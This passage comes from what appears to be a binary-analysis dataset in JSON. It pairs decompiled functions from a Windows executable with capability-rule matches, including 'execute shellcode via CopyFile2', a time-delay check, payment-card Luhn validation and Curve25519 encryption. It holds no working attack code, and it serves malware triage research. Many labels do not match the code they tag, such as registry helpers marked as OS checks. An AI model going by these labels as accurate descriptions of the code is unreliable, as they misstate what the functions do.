        "decompiled_code": "\nvoid __cdecl fcn.00423ac0(int32_t arg_8h, int16_t *arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    uint var_104h;\n    uint var_4h;\n    \n    if (0x40 < *(arg_10h + 1)) {\n        fcn.0040dab4();\n        arg_ch = fcn.00404eb4();\n    }\n    if (*arg_ch == 9) {\n        var_4h = *(arg_ch + 4);\n    }\n    else if (*arg_ch == 0x4009) {\n        var_4h = **(arg_ch + 4);\n    }\n    else {\n        fcn.00423aa8();\n    }\n    fcn.004239c8(&var_104h);\n    if (arg_8h != 0) {\n        fcn.00411420();\n    }\n    fcn.00423658(arg_8h, arg_14h);\n    return;\n}\n",
        "token_count": 223
    },
    "0042ef8c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\nint32_t * fcn.0042ef8c(void)\n\n{\n    uint arg_ch;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_18h;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    puStack44 = 0x42efa6;\n    var_8h = fcn.0042cbe0();\n    uStack48 = 0x42f06b;\n    iStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack44 = &stack0xfffffffc;\n    (**(*var_8h + 0x40))();\n    (**(*var_8h + 0x34))();\n    fcn.0042d1b4();\n    fcn.00428520();\n    fcn.00428404();\n    arg_ch = (**(*var_8h + 0x20))();\n    arg_8h = &fcn.0042ef8c::var_18h;\n    (**(*var_8h + 0x2c))();\n    fcn.004181c0(arg_8h, arg_ch);\n    fcn.004287a8();\n    uVar4 = 0;\n    do {\n        uVar3 = 0;\n        do {\n            uVar1 = uVar4 & 0x80000001;\n            if (uVar1 < 0) {\n                uVar1 = (uVar1 - 1 | 0xfffffffe) + 1;\n            }\n            uVar2 = uVar3 & 0x80000001;\n            if (uVar2 < 0) {\n                uVar2 = (uVar2 - 1 | 0xfffffffe) + 1;\n            }\n            if (uVar1 == uVar2) {\n                fcn.00428b18(var_4h);\n            }\n            uVar3 = uVar3 + 1;\n        } while (uVar3 != 9);\n        uVar4 = uVar4 + 1;\n    } while (uVar4 != 9);\n    fcn.0042ce70();\n    *in_FS_OFFSET = arg_8h;\n    return var_8h;\n}\n",
        "token_count": 546
    },
    "0044b31c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\nvoid fcn.0044b31c(void)\n\n{\n    int32_t iVar1;\n    uint16_t uVar2;\n    int32_t in_EAX;\n    uint32_t uVar3;\n    \n    if (*(in_EAX + 0x16b8) < 0xe) {\n        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | 2 << (*(in_EAX + 0x16b8) & 0x1f);\n        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + 3;\n    }\n    else {\n        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | 2 << (*(in_EAX + 0x16b8) & 0x1f);\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4);\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4) >> 8;\n        *(in_EAX + 0x16b4) = 2 >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + -0xd;\n    }\n    uVar2 = *0x4a3c18;\n    uVar3 = str._a__a__a__a[0];\n    if (0x10 - uVar3 < *(in_EAX + 0x16b8)) {\n        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | *0x4a3c18 << (*(in_EAX + 0x16b8) & 0x1f);\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4);\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4) >> 8;\n        *(in_EAX + 0x16b4) = uVar2 >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n        *(in_EAX + 0x16b8) = (uVar3 - 0x10) + *(in_EAX + 0x16b8);\n    }\n    else {\n        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | *0x4a3c18 << (*(in_EAX + 0x16b8) & 0x1f);\n        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + uVar3;\n    }\n    fcn.0044bde8();\n    iVar1 = *(in_EAX + 0x16b8);\n    if ((*(in_EAX + 0x16b0) + 0xb) - iVar1 < 9) {\n        if (iVar1 < 0xe) {\n            *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | 2 << (*(in_EAX + 0x16b8) & 0x1f);\n            *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + 3;\n        }\n        else {\n            *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | 2 << (iVar1 & 0x1f);\n            iVar1 = *(in_EAX + 0x14);\n            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n            *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4);\n            iVar1 = *(in_EAX + 0x14);\n            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n            *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4) >> 8;\n            *(in_EAX + 0x16b4) = 2 >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n            *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + -0xd;\n        }\n        uVar2 = *0x4a3c18;\n        uVar3 = str._a__a__a__a[0];\n        if (0x10 - uVar3 < *(in_EAX + 0x16b8)) {\n            *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | *0x4a3c18 << (*(in_EAX + 0x16b8) & 0x1f);\n            iVar1 = *(in_EAX + 0x14);\n            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n            *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4);\n            iVar1 = *(in_EAX + 0x14);\n            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n            *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4) >> 8;\n            *(in_EAX + 0x16b4) = uVar2 >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n            *(in_EAX + 0x16b8) = (uVar3 - 0x10) + *(in_EAX + 0x16b8);\n        }\n        else {\n            *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | *0x4a3c18 << (*(in_EAX + 0x16b8) & 0x1f);\n            *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + uVar3;\n        }\n        fcn.0044bde8();\n    }\n    *(in_EAX + 0x16b0) = 7;\n    return;\n}\n",
        "token_count": 1688
    },
    "0041d6f8": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nunkbyte10 fcn.0041d6f8(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    unkbyte10 Stack16;\n    \n    cVar1 = fcn.0041e8c8();\n    if (cVar1 == '\\x05') {\n        fcn.0041cd60();\n    }\n    else {\n        *(in_EAX + 0x10) = *(in_EAX + 0x10) + -1;\n        Stack16 = fcn.0041d730();\n    }\n    return Stack16;\n}\n",
        "token_count": 125
    },
    "0043ea04": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nvoid fcn.0043ea04(void)\n\n{\n    int32_t *in_EAX;\n    \n    // switch table (6 cases) at 0x43ea13\n    switch(in_EAX[10]) {\n    case 0:\n        fcn.0043ea78();\n        return;\n    case 1:\n        fcn.0043ea78();\n        return;\n    case 2:\n        fcn.0043ea78();\n        return;\n    case 3:\n        fcn.0043ea78();\n        return;\n    case 4:\n        fcn.0043ea78();\n        return;\n    case 5:\n        fcn.0043ea78();\n        return;\n    default:\n        *(*in_EAX + 0x14) = 9;\n        (***in_EAX)();\n        return;\n    }\n}\n",
        "token_count": 180
    },
    "0045fffc": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0045fffc(uint *param_1, uint *param_2)\n\n{\n    uint8_t uVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t *in_EAX;\n    uint uVar4;\n    \n    if (*(in_EAX + 0x5b) == '\\x05') {\n        uVar4 = CONCAT31(in_EAX >> 8, 1);\n    }\n    else {\n        uVar2 = *param_2;\n        uVar3 = *param_1;\n        uVar4 = (**(*in_EAX + 0x34))();\n        uVar1 = *(in_EAX + 0x5b);\n        if ((uVar1 == 0) || (uVar1 - 3 < 2)) {\n            *param_2 = uVar2;\n        }\n        param_2 = uVar1 - 3;\n        if (uVar1 < 3) {\n            *param_1 = uVar3;\n            param_2 = param_1;\n        }\n    }\n    return CONCAT44(param_2, uVar4);\n}\n",
        "token_count": 248
    },
    "0048bce0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2",
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0048bce0(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint hKey;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = 0x48bcf4;\n    var_8h = param_2;\n    fcn.004058ec();\n    puStack20 = 0x48bcfc;\n    fcn.004058ec();\n    uStack24 = 0x48be52;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    uVar1 = fcn.00409dd8();\n    // switch table (6 cases) at 0x48bd22\n    switch(uVar1) {\n    case 0:\n        uVar1 = fcn.004058fc(0, 0, 0, 0x20006, 0, &fcn.0048bce0::hKey, 0);\n        sub.advapi32.dll_RegCreateKeyExA(0x80000000, uVar1);\n        break;\n    case 1:\n        uVar1 = fcn.004058fc(0, 0, 0, 0x20006, 0, &fcn.0048bce0::hKey, 0);\n        sub.advapi32.dll_RegCreateKeyExA(0x80000001, uVar1);\n        break;\n    case 2:\n        uVar1 = fcn.004058fc(0, 0, 0, 0x20006, 0, &fcn.0048bce0::hKey, 0);\n        sub.advapi32.dll_RegCreateKeyExA(0x80000002, uVar1);\n        break;\n    case 3:\n        uVar1 = fcn.004058fc(0, 0, 0, 0x20006, 0, &fcn.0048bce0::hKey, 0);\n        sub.advapi32.dll_RegCreateKeyExA(0x80000003, uVar1);\n        break;\n    case 4:\n        uVar1 = fcn.004058fc(0, 0, 0, 0x20006, 0, &fcn.0048bce0::hKey, 0);\n        sub.advapi32.dll_RegCreateKeyExA(0x80000005, uVar1);\n        break;\n    case 5:\n        uVar1 = fcn.004058fc(0, 0, 0, 0x20006, 0, &fcn.0048bce0::hKey, 0);\n        sub.advapi32.dll_RegCreateKeyExA(0x80000006, uVar1);\n    }\n    sub.advapi32.dll_RegCloseKey_1();\n    *in_FS_OFFSET = hKey;\n    fcn.00405490(0x48be59);\n    return;\n}\n",
        "token_count": 690
    },
    "0048be60": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0048be60(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint hKey;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = 0x48be77;\n    var_8h = param_2;\n    fcn.004058ec();\n    puStack24 = 0x48be7f;\n    fcn.004058ec();\n    puStack24 = 0x48be87;\n    fcn.004058ec();\n    uStack28 = 0x48bfbc;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    uVar1 = fcn.00409dd8();\n    // switch table (6 cases) at 0x48bead\n    switch(uVar1) {\n    case 0:\n        uVar1 = fcn.004058fc(0, 0xf003f, &fcn.0048be60::hKey);\n        sub.advapi32.dll_RegOpenKeyExA_1(0x80000000, uVar1);\n        break;\n    case 1:\n        uVar1 = fcn.004058fc(0, 0xf003f, &fcn.0048be60::hKey);\n        sub.advapi32.dll_RegOpenKeyExA_1(0x80000001, uVar1);\n        break;\n    case 2:\n        uVar1 = fcn.004058fc(0, 0xf003f, &fcn.0048be60::hKey);\n        sub.advapi32.dll_RegOpenKeyExA_1(0x80000002, uVar1);\n        break;\n    case 3:\n        uVar1 = fcn.004058fc(0, 0xf003f, &fcn.0048be60::hKey);\n        sub.advapi32.dll_RegOpenKeyExA_1(0x80000003, uVar1);\n        break;\n    case 4:\n        uVar1 = fcn.004058fc(0, 0xf003f, &fcn.0048be60::hKey);\n        sub.advapi32.dll_RegOpenKeyExA_1(0x80000005, uVar1);\n        break;\n    case 5:\n        uVar1 = fcn.004058fc(0, 0xf003f, &fcn.0048be60::hKey);\n        sub.advapi32.dll_RegOpenKeyExA_1(0x80000006, uVar1);\n    }\n    uVar1 = fcn.004058fc();\n    sub.advapi32.dll_RegDeleteValueA(hKey, uVar1);\n    sub.advapi32.dll_RegCloseKey_1();\n    *in_FS_OFFSET = hKey;\n    fcn.00405490(0x48bfc3);\n    return;\n}\n",
        "token_count": 678
    },
    "0048bfc8": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0048bfc8(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint hKey;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = 0x48bfdc;\n    var_8h = param_2;\n    fcn.004058ec();\n    puStack20 = 0x48bfe4;\n    fcn.004058ec();\n    uStack24 = 0x48c115;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    uVar1 = fcn.00409dd8();\n    // switch table (6 cases) at 0x48c00a\n    switch(uVar1) {\n    case 0:\n        uVar1 = fcn.004058fc(0, 0xf003f, &fcn.0048bfc8::hKey);\n        sub.advapi32.dll_RegOpenKeyExA_1(0x80000000, uVar1);\n        break;\n    case 1:\n        uVar1 = fcn.004058fc(0, 0xf003f, &fcn.0048bfc8::hKey);\n        sub.advapi32.dll_RegOpenKeyExA_1(0x80000001, uVar1);\n        break;\n    case 2:\n        uVar1 = fcn.004058fc(0, 0xf003f, &fcn.0048bfc8::hKey);\n        sub.advapi32.dll_RegOpenKeyExA_1(0x80000002, uVar1);\n        break;\n    case 3:\n        uVar1 = fcn.004058fc(0, 0xf003f, &fcn.0048bfc8::hKey);\n        sub.advapi32.dll_RegOpenKeyExA_1(0x80000003, uVar1);\n        break;\n    case 4:\n        uVar1 = fcn.004058fc(0, 0xf003f, &fcn.0048bfc8::hKey);\n        sub.advapi32.dll_RegOpenKeyExA_1(0x80000005, uVar1);\n        break;\n    case 5:\n        uVar1 = fcn.004058fc(0, 0xf003f, &fcn.0048bfc8::hKey);\n        sub.advapi32.dll_RegOpenKeyExA_1(0x80000006, uVar1);\n    }\n    sub.advapi32.dll_RegDeleteKeyA(hKey, 0x48c120);\n    sub.advapi32.dll_RegCloseKey_1();\n    *in_FS_OFFSET = hKey;\n    fcn.00405490(0x48c11c);\n    return;\n}\n",
        "token_count": 652
    },
    "00404438": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad",
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00404438(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint *puStack20;\n    uint var_ch;\n    uint32_t var_8h;\n    uint hKey;\n    \n    var_8h = *0x4a1024;\n    puStack20 = &fcn.00404438::hKey;\n    uStack24 = 1;\n    uStack28 = 0;\n    uStack32 = 0x4044d0;\n    uStack36 = 0x80000002;\n    puStack40 = 0x40445f;\n    iVar1 = sub.advapi32.dll_RegOpenKeyExA();\n    if (iVar1 == 0) {\n        uStack44 = 0x4044a9;\n        uStack48 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd0;\n        var_ch = 4;\n        uVar2 = hKey;\n        puStack40 = &stack0xfffffffc;\n        sub.advapi32.dll_RegQueryValueExA(hKey, 0x4044ec, 0, 0, &fcn.00404438::var_8h, &fcn.00404438::var_ch);\n        *in_FS_OFFSET = uVar2;\n        sub.advapi32.dll_RegCloseKey(hKey, 0x4044b0);\n        return;\n    }\n    *0x4a1024 = *0x4a1024 & 0xffc0 | var_8h & 0x3f;\n    return;\n}\n",
        "token_count": 402
    },
    "00430b0c": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00430b0c(uint32_t param_1)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    \n    uVar1 = *(in_EAX + 0x10);\n    *(in_EAX + 0x10) = *(in_EAX + 0x10) + param_1;\n    if (*(in_EAX + 0x10) <= uVar1 && uVar1 != *(in_EAX + 0x10)) {\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n    }\n    uVar1 = 0x40 - (uVar1 & 0x3f);\n    if (param_1 < uVar1) {\n        fcn.004030ec();\n    }\n    else {\n        fcn.004030ec();\n        fcn.00430c30();\n        for (param_1 = param_1 - uVar1; 0x3f < param_1; param_1 = param_1 - 0x40) {\n            fcn.004030ec();\n            fcn.00430c30();\n        }\n        fcn.004030ec();\n    }\n    return;\n}\n",
        "token_count": 274
    },
    "00430ba0": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nvoid fcn.00430ba0(void)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    \n    uVar1 = *(in_EAX + 0x10) & 0x3f;\n    *(in_EAX + 0x18 + uVar1) = 0x80;\n    if (0x37 - uVar1 < 0) {\n        fcn.00403ae4();\n        fcn.00430c30();\n    }\n    fcn.00403ae4();\n    *(in_EAX + 0x50) = *(in_EAX + 0x10) * 8;\n    *(in_EAX + 0x54) = *(in_EAX + 0x14) * 8 | *(in_EAX + 0x10) >> 0x1d;\n    fcn.00430c30();\n    fcn.004030ec();\n    fcn.00403ae4();\n    return;\n}\n",
        "token_count": 215
    },
    "0040dbf8": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489",
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nvoid fcn.0040dbf8(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iStack16;\n    uchar uStack12;\n    \n    iVar1 = fcn.004030cc();\n    for (iVar2 = 0; (iVar2 < 7 && (iVar1 != *(iVar2 * 8 + 0x4a1940))); iVar2 = iVar2 + 1) {\n    }\n    if (iVar2 < 7) {\n        iVar2 = fcn.0040d9f8();\n    }\n    else {\n        uStack12 = 0;\n        iStack16 = iVar1;\n        iVar2 = fcn.0040daf0(0, &iStack16);\n    }\n    *(iVar2 + 0xc) = iVar1;\n    return;\n}\n",
        "token_count": 183
    },
    "004623c4": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004623c4(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uchar in_CL;\n    int32_t in_EDX;\n    uint var_5h;\n    \n    uVar1 = 0;\n    // switch table (7 cases) at 0x4623ea\n    switch(in_CL) {\n    case 1:\n        iVar2 = (**(**(in_EAX + 0x78) + 0x10))();\n        uVar1 = (**(**(in_EDX + 0x78) + 0x10))();\n        uVar1 = uVar1 & 0xffffff00 | iVar2 < uVar1;\n        break;\n    case 2:\n        iVar2 = (**(**(in_EAX + 0x78) + 0x10))();\n        iVar3 = (**(**(in_EAX + 0x78) + 0x10))();\n        iVar4 = (**(**(in_EDX + 0x78) + 0x10))();\n        uVar1 = (**(**(in_EDX + 0x78) + 0x10))();\n        uVar1 = uVar1 & 0xffffff00 | iVar4 + uVar1 <= iVar2 + iVar3;\n        break;\n    case 3:\n        iVar2 = (**(**(in_EAX + 0x78) + 0x10))();\n        uVar1 = (**(**(in_EDX + 0x78) + 0x10))();\n        uVar1 = uVar1 & 0xffffff00 | iVar2 < uVar1;\n        break;\n    case 4:\n        iVar2 = (**(**(in_EAX + 0x78) + 0x10))();\n        iVar3 = (**(**(in_EAX + 0x78) + 0x10))();\n        iVar4 = (**(**(in_EDX + 0x78) + 0x10))();\n        uVar1 = (**(**(in_EDX + 0x78) + 0x10))();\n        uVar1 = uVar1 & 0xffffff00 | iVar4 + uVar1 <= iVar2 + iVar3;\n        break;\n    case 6:\n        uVar1 = (**(**(arg_8h + -4) + 0xa8))();\n    }\n    return uVar1;\n}\n",
        "token_count": 555
    },
    "0042767c": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nvoid fcn.0042767c(void)\n\n{\n    uint32_t in_EAX;\n    \n    if (in_EAX < 0) {\n        sub.user32.dll_GetSysColor(in_EAX & 0xff);\n    }\n    return;\n}\n",
        "token_count": 54
    },
    "0043f6e8": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nvoid fcn.0043f6e8(void)\n\n{\n    fcn.0043f698();\n    fcn.0043f698();\n    return;\n}\n",
        "token_count": 36
    },
    "004470b4": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004470b4(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    \n    iVar1 = *(in_EAX + 0x14);\n    *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n    *(*(in_EAX + 8) + iVar1) = param_2 >> 8;\n    iVar1 = *(in_EAX + 0x14);\n    *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n    *(*(in_EAX + 8) + iVar1) = param_2;\n    return;\n}\n",
        "token_count": 163
    },
    "0044b260": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044b260(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x16b8) < 0xe) {\n        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | arg_8h << (*(in_EAX + 0x16b8) & 0x1f);\n        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + 3;\n    }\n    else {\n        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | arg_8h << (*(in_EAX + 0x16b8) & 0x1f);\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4);\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4) >> 8;\n        *(in_EAX + 0x16b4) = arg_8h >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + -0xd;\n    }\n    fcn.0044bec4(1);\n    return;\n}\n",
        "token_count": 435
    },
    "0044bde8": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nvoid fcn.0044bde8(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x16b8) == 0x10) {\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4);\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4) >> 8;\n        *(in_EAX + 0x16b4) = 0;\n        *(in_EAX + 0x16b8) = 0;\n        return;\n    }\n    if (7 < *(in_EAX + 0x16b8)) {\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4);\n        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) >> 8;\n        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + -8;\n    }\n    return;\n}\n",
        "token_count": 378
    },
    "0049f700": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nvoid fcn.0049f700(void)\n\n{\n    uint8_t uVar1;\n    uint *in_FS_OFFSET;\n    bool bVar2;\n    uint uStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x49f786;\n    uStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack16;\n    bVar2 = *0x4aaff4 == 0;\n    *0x4aaff4 = *0x4aaff4 + -1;\n    if (bVar2) {\n        uVar1 = sub.kernel32.dll_GetVersion();\n        *0x4aaff0 = 3 < uVar1;\n        fcn.0046c190();\n        fcn.00418e4c();\n        fcn.00418eec();\n        fcn.00418e98();\n        fcn.00418e98();\n        fcn.00418e98();\n    }\n    *in_FS_OFFSET = uStack16;\n    return;\n}\n",
        "token_count": 239
    },
    "00445098": {
        "rules": [
            "encrypt data using Curve25519/bbf924b96e5b4ce780ce59f68f21b030",
            "encrypt data using Curve25519/bbf924b96e5b4ce780ce59f68f21b030",
            "encrypt data using Curve25519/bbf924b96e5b4ce780ce59f68f21b030",
            "encrypt data using Curve25519/bbf924b96e5b4ce780ce59f68f21b030"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00445098(uint32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = 0;\n    if ((arg_8h & 0x4000000) != 0) {\n        uVar1 = 0x200;\n    }\n    if ((arg_8h & 0x20000000) == 0) {\n        if ((arg_8h & 0x40000000) == 0) {\n            if ((arg_8h & 0x80000000) == 0) {\n                uVar1 = uVar1 | 1;\n            }\n            else {\n                uVar1 = uVar1 | 8;\n            }\n        }\n        else if ((arg_8h & 0x80000000) == 0) {\n            uVar1 = uVar1 | 2;\n        }\n        else {\n            uVar1 = uVar1 | 4;\n        }\n    }\n    else if ((arg_8h & 0x40000000) == 0) {\n        if ((arg_8h & 0x80000000) == 0) {\n            uVar1 = uVar1 | 0x10;\n        }\n        else {\n            uVar1 = uVar1 | 0x80;\n        }\n    }\n    else if ((arg_8h & 0x80000000) == 0) {\n        uVar1 = uVar1 | 0x20;\n    }\n    else {\n        uVar1 = uVar1 | 0x40;\n    }\n    return uVar1;\n}\n",
        "token_count": 358
    },
    "00424974": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00424974(uint *arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint in_ECX;\n    uint extraout_ECX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.00404964();\n        in_ECX = extraout_ECX;\n        in_DL = extraout_DL;\n    }\n    *(in_EAX + 4) = 0;\n    fcn.00406f3c();\n    fcn.00406f3c();\n    fcn.00406f3c();\n    fcn.00406f3c();\n    fcn.00406f3c();\n    *(in_EAX + 0x1c) = 0;\n    fcn.00406f3c();\n    fcn.00406f3c();\n    fcn.00406f3c();\n    fcn.00406f3c();\n    fcn.00406f3c();\n    fcn.00406f3c();\n    *(in_EAX + 0x3c) = 0;\n    fcn.00406f3c();\n    fcn.00406f3c();\n    *(in_EAX + 0x48) = 0;\n    *(in_EAX + 0x4c) = 0;\n    fcn.00404610();\n    *(in_EAX + 4) = in_ECX;\n    uVar1 = fcn.00424a48();\n    *arg_8h = uVar1;\n    if (in_DL != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 413
    },
    "0042fa34": {
        "rules": [
            "decompress data using LZO/83f2e70ad753438b83eb63e4275895e9",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
